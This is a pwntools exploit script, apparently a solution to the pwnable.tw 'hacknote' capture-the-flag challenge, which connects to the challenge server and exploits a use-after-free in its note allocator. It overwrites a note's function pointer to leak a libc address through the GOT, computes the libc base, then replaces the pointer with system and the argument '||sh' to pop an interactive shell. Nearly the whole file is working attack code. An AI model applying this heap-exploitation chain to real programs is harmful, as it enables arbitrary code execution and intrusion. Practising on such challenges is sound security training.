#!/home/thomason/.virtualenv/pwnshop/bin/python

from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10102
LOCAL = False
challenge = "./hacknote"
elf = ELF(challenge, checksec=False)
# libc = ELF(elf.libc.path, checksec=False)
libc = ELF("./libc_32.so.6", checksec=False)

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            b *0x80488A5
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
def add_note(size, content):
    ru(':')
    sl('1')
    ru(':')
    sl(str(size))
    ru(':')
    sl(content)
    
def del_note(idx):
    ru(':')
    sl('2')
    ru(':')
    sl(str(idx))

def print_note(idx):
    ru(':')
    sl('3')
    ru(':')
    sl(str(idx))
    return rl

add_note(8, "AAAA")
add_note(16, "BBBB")
del_note(0)
del_note(1)
add_note(8, p32(0x804862b) + p32(0x804A024))
print_note(0)

ru(':')
leak = u32(r(4))
libc.address = leak  - libc.symbols[b"puts"]
print("[COMPUTE] LIBC ADDR: ", hex(libc.address))

del_note(2)
add_note(8, p32(libc.symbols[b"system"]) + b"||sh")
print_note(0)

p.interactive()

